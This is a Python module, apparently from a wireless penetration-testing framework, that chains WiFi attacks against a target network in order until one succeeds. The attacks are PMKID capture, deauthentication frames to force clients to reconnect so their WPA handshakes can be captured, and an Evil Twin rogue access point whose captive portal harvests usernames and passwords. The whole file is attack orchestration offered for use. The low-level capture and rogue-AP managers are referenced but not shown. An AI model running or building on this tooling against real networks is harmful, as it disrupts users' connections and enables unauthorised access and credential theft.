"""
AutoPwn Attack Chain.

Provides sequential attack execution with fallback strategies.

Features:
- Abstract Attack base class for extensibility
- Concrete attacks: PMKID, Deauth+Handshake, Evil Twin
- Configurable attack ordering with stop-on-success
- Callback hooks for attack start/complete events
- Integration with posframework's HandshakeCapture and RogueAPEngine

Usage:
    chain = AttackChain(config=AttackChainConfig(), capture_manager=hcap)
    results = await chain.execute(target)
    if chain.get_successful_result():
        print("Attack succeeded!")
"""

from __future__ import annotations

import asyncio
import logging
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks."""

    # WiFi Attacks
    PMKID = auto()
    DEAUTH_HANDSHAKE = auto()
    EVIL_TWIN = auto()
    KARMA = auto()
    WPA3_DOWNGRADE = auto()

    # BLE Attacks
    BLE_ENUM = auto()
    BLE_SNIFF = auto()

    # Post-Capture
    CRACK_LOCAL = auto()
    CRACK_CLOUD = auto()


class AttackStatus(Enum):
    """Attack execution status."""

    PENDING = auto()
    RUNNING = auto()
    SUCCESS = auto()
    FAILED = auto()
    SKIPPED = auto()
    TIMEOUT = auto()


@dataclass
class AttackResult:
    """Result of an attack attempt."""

    attack_type: AttackType
    status: AttackStatus
    target_id: str

    # Timing
    started_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None
    duration_seconds: float = 0.0

    # Results
    success: bool = False
    capture_file: Optional[str] = None
    credential: Optional[str] = None
    error: Optional[str] = None

    # Metadata
    details: Dict[str, Any] = field(default_factory=dict)

    def complete(self, success: bool, error: Optional[str] = None) -> None:
        """Mark attack as complete."""
        self.completed_at = datetime.now()
        self.success = success
        self.error = error
        self.status = AttackStatus.SUCCESS if success else AttackStatus.FAILED
        self.duration_seconds = (
            self.completed_at - self.started_at
        ).total_seconds()


class Attack(ABC):
    """Base class for attack implementations."""

    attack_type: AttackType
    name: str
    description: str

    # Requirements
    requires_client: bool = False
    requires_handshake: bool = False
    supports_wpa3: bool = False

    # Timing
    default_timeout: float = 60.0

    def __init__(self) -> None:
        self._running = False
        self._cancelled = False

    @abstractmethod
    async def execute(
        self,
        target: Any,
        timeout: Optional[float] = None,
    ) -> AttackResult:
        """Execute the attack against target."""
        ...

    async def cancel(self) -> None:
        """Cancel the running attack."""
        self._cancelled = True

    def can_attack(self, target: Any) -> Tuple[bool, str]:
        """Check if this attack can be used on target."""
        # Check WPA3 support
        if getattr(target, "is_wpa3", False) and not self.supports_wpa3:
            return False, "WPA3 not supported"

        # Check client requirement
        if self.requires_client and not getattr(
            target, "has_active_clients", False
        ):
            return False, "No active clients"

        # Check if already tried and failed
        failed = getattr(target, "failed_attacks", [])
        if self.attack_type.name in failed:
            return False, "Already failed"

        return True, ""


class PMKIDAttack(Attack):
    """
    PMKID capture attack.

    Clientless attack that grabs PMKID from AP's first EAPOL message.
    Works on WPA2-PSK networks.
    """

    attack_type = AttackType.PMKID
    name = "PMKID Capture"
    description = "Capture PMKID from AP (no client needed)"
    requires_client = False
    supports_wpa3 = False
    default_timeout = 30.0

    def __init__(self, capture_manager: Any = None) -> None:
        super().__init__()
        self._capture_manager = capture_manager

    async def execute(
        self,
        target: Any,
        timeout: Optional[float] = None,
    ) -> AttackResult:
        """Execute PMKID capture."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )

        logger.info(
            "Starting PMKID attack on %s (%s)",
            target.ssid, target.bssid,
        )

        try:
            self._running = True
            self._cancelled = False

            if self._capture_manager:
                capture_result = await asyncio.wait_for(
                    self._capture_manager.capture_pmkid(
                        bssid=target.bssid,
                        channel=target.channel,
                    ),
                    timeout=timeout,
                )

                if capture_result and capture_result.get("pmkid"):
                    result.success = True
                    result.capture_file = capture_result.get("file")
                    result.details["pmkid"] = capture_result.get("pmkid")
                    logger.info("PMKID captured for %s", target.ssid)
                else:
                    result.success = False
                    result.error = "No PMKID in response"
            else:
                # Mock implementation for testing
                await asyncio.sleep(0.1)
                import random

                if random.random() < 0.4:
                    result.success = True
                    result.capture_file = f"/tmp/{target.bssid}.pmkid"
                    result.details["pmkid"] = "mock_pmkid_hash"
                else:
                    result.success = False
                    result.error = "AP does not support PMKID"

        except (TimeoutError, asyncio.TimeoutError):
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"

        except asyncio.CancelledError:
            result.status = AttackStatus.SKIPPED
            result.error = "Cancelled"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)
            logger.error("PMKID attack error: %s", e)

        finally:
            self._running = False
            result.complete(result.success, result.error)

        return result


class DeauthHandshakeAttack(Attack):
    """
    Deauth + Handshake capture attack.

    Sends deauth frames to force client reconnection,
    then captures the WPA handshake.
    """

    attack_type = AttackType.DEAUTH_HANDSHAKE
    name = "Deauth + Handshake"
    description = "Force reconnection and capture handshake"
    requires_client = True
    supports_wpa3 = False
    default_timeout = 120.0

    def __init__(
        self,
        capture_manager: Any = None,
        deauth_count: int = 5,
        deauth_interval: float = 2.0,
    ) -> None:
        super().__init__()
        self._capture_manager = capture_manager
        self._deauth_count = deauth_count
        self._deauth_interval = deauth_interval

    async def execute(
        self,
        target: Any,
        timeout: Optional[float] = None,
    ) -> AttackResult:
        """Execute deauth + handshake capture."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )

        active_clients = getattr(target, "active_clients", [])
        logger.info(
            "Starting deauth attack on %s (%d clients)",
            target.ssid, len(active_clients),
        )

        try:
            self._running = True
            self._cancelled = False

            if self._capture_manager:
                # Start capture
                await self._capture_manager.start_capture(
                    bssid=target.bssid,
                    channel=target.channel,
                )

                # Send deauths
                for client in active_clients[:3]:
                    for _ in range(self._deauth_count):
                        if self._cancelled:
                            break
                        await self._capture_manager.send_deauth(
                            bssid=target.bssid,
                            client=client,
                        )
                        await asyncio.sleep(self._deauth_interval)

                # Wait for handshake
                capture_result = await asyncio.wait_for(
                    self._capture_manager.wait_handshake(target.bssid),
                    timeout=timeout - 30,
                )

                if capture_result and capture_result.get("handshake"):
                    result.success = True
                    result.capture_file = capture_result.get("file")
                    logger.info("Handshake captured for %s", target.ssid)
                else:
                    result.success = False
                    result.error = "No handshake captured"

            else:
                # Mock implementation
                await asyncio.sleep(0.1)
                import random

                if random.random() < 0.6:
                    result.success = True
                    result.capture_file = f"/tmp/{target.bssid}.cap"
                else:
                    result.success = False
                    result.error = "Client did not reconnect"

        except (TimeoutError, asyncio.TimeoutError):
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"

        except asyncio.CancelledError:
            result.status = AttackStatus.SKIPPED
            result.error = "Cancelled"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)
            logger.error("Deauth attack error: %s", e)

        finally:
            self._running = False
            if self._capture_manager:
                await self._capture_manager.stop_capture()
            result.complete(result.success, result.error)

        return result


class EvilTwinAttack(Attack):
    """
    Evil Twin attack with captive portal.

    Creates a rogue AP mimicking target, with captive portal
    to harvest credentials.
    """

    attack_type = AttackType.EVIL_TWIN
    name = "Evil Twin"
    description = "Rogue AP with credential harvesting"
    requires_client = False
    supports_wpa3 = True
    default_timeout = 300.0

    def __init__(self, eviltwin_manager: Any = None) -> None:
        super().__init__()
        self._eviltwin_manager = eviltwin_manager

    async def execute(
        self,
        target: Any,
        timeout: Optional[float] = None,
    ) -> AttackResult:
        """Execute Evil Twin attack."""
        timeout = timeout or self.default_timeout
        result = AttackResult(
            attack_type=self.attack_type,
            status=AttackStatus.RUNNING,
            target_id=target.id,
        )

        logger.info("Starting Evil Twin attack on %s", target.ssid)

        try:
            self._running = True

            if self._eviltwin_manager:
                await self._eviltwin_manager.start(
                    ssid=target.ssid,
                    channel=target.channel,
                )

                cred_result = await asyncio.wait_for(
                    self._eviltwin_manager.wait_credential(),
                    timeout=timeout,
                )

                if cred_result:
                    result.success = True
                    result.credential = cred_result.get("password")
                    result.details["username"] = cred_result.get("username")
                    logger.info("Credential captured for %s", target.ssid)
                else:
                    result.success = False
                    result.error = "No credential captured"
            else:
                # Mock - Evil Twin usually runs longer
                await asyncio.sleep(0.1)
                result.success = False
                result.error = "No victims connected"

        except (TimeoutError, asyncio.TimeoutError):
            result.status = AttackStatus.TIMEOUT
            result.error = f"Timeout after {timeout}s"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error = str(e)

        finally:
            self._running = False
            if self._eviltwin_manager:
                await self._eviltwin_manager.stop()
            result.complete(result.success, result.error)

        return result


@dataclass
class AttackChainConfig:
    """Configuration for attack chain."""

    # Attack order (first to last)
    attack_order: List[AttackType] = field(default_factory=lambda: [
        AttackType.PMKID,
        AttackType.DEAUTH_HANDSHAKE,
        AttackType.EVIL_TWIN,
    ])

    # Timing
    attack_timeout: float = 120.0
    delay_between_attacks: float = 5.0

    # Behavior
    stop_on_success: bool = True
    retry_failed: bool = False
    max_retries: int = 1


class AttackChain:
    """
    Manages sequential attack execution.

    Tries attacks in order until one succeeds or all fail.
    Supports fallback strategies and callback hooks.
    """

    def __init__(
        self,
        config: Optional[AttackChainConfig] = None,
        capture_manager: Any = None,
        eviltwin_manager: Any = None,
    ) -> None:
        self.config = config or AttackChainConfig()

        # Initialize attacks
        self._attacks: Dict[AttackType, Attack] = {
            AttackType.PMKID: PMKIDAttack(capture_manager),
            AttackType.DEAUTH_HANDSHAKE: DeauthHandshakeAttack(capture_manager),
            AttackType.EVIL_TWIN: EvilTwinAttack(eviltwin_manager),
        }

        self._current_attack: Optional[Attack] = None
        self._results: List[AttackResult] = []
        self._running = False

        # Callbacks
        self._on_attack_start: List[
            Callable[[Attack, Any], Coroutine[Any, Any, None]]
        ] = []
        self._on_attack_complete: List[
            Callable[[AttackResult], Coroutine[Any, Any, None]]
        ] = []

    def on_attack_start(
        self,
        callback: Callable[[Attack, Any], Coroutine[Any, Any, None]],
    ) -> None:
        """Register callback for attack start."""
        self._on_attack_start.append(callback)

    def on_attack_complete(
        self,
        callback: Callable[[AttackResult], Coroutine[Any, Any, None]],
    ) -> None:
        """Register callback for attack completion."""
        self._on_attack_complete.append(callback)

    async def _notify_start(self, attack: Attack, target: Any) -> None:
        """Notify attack start."""
        for callback in self._on_attack_start:
            try:
                await callback(attack, target)
            except Exception as e:
                logger.error("Attack start callback error: %s", e)

    async def _notify_complete(self, result: AttackResult) -> None:
        """Notify attack completion."""
        for callback in self._on_attack_complete:
            try:
                await callback(result)
            except Exception as e:
                logger.error("Attack complete callback error: %s", e)

    async def execute(self, target: Any) -> List[AttackResult]:
        """
        Execute attack chain against target.

        Tries attacks in configured order until success or exhausted.
        """
        self._results = []
        self._running = True

        logger.info(
            "Starting attack chain on %s (%s)",
            target.ssid, target.bssid,
        )

        for attack_type in self.config.attack_order:
            if not self._running:
                break

            attack = self._attacks.get(attack_type)
            if not attack:
                logger.warning("Attack type %s not implemented", attack_type)
                continue

            # Check if attack can be used
            can_attack, reason = attack.can_attack(target)
            if not can_attack:
                logger.debug("Skipping %s: %s", attack.name, reason)
                result = AttackResult(
                    attack_type=attack_type,
                    status=AttackStatus.SKIPPED,
                    target_id=target.id,
                )
                result.error = reason
                self._results.append(result)
                continue

            # Execute attack
            self._current_attack = attack
            await self._notify_start(attack, target)

            result = await attack.execute(
                target,
                timeout=self.config.attack_timeout,
            )

            self._results.append(result)
            await self._notify_complete(result)

            # Check result
            if result.success:
                logger.info(
                    "Attack %s succeeded on %s", attack.name, target.ssid
                )
                if self.config.stop_on_success:
                    break
            else:
                logger.info(
                    "Attack %s failed: %s", attack.name, result.error
                )
                failed_attacks = getattr(target, "failed_attacks", None)
                if failed_attacks is not None:
                    failed_attacks.append(attack_type.name)

            # Delay between attacks
            if self.config.delay_between_attacks > 0:
                await asyncio.sleep(self.config.delay_between_attacks)

        self._running = False
        self._current_attack = None

        return self._results

    async def cancel(self) -> None:
        """Cancel the current attack chain."""
        self._running = False
        if self._current_attack:
            await self._current_attack.cancel()

    @property
    def is_running(self) -> bool:
        """Check if chain is running."""
        return self._running

    @property
    def results(self) -> List[AttackResult]:
        """Get attack results."""
        return self._results

    def get_successful_result(self) -> Optional[AttackResult]:
        """Get first successful result."""
        for result in self._results:
            if result.success:
                return result
        return None
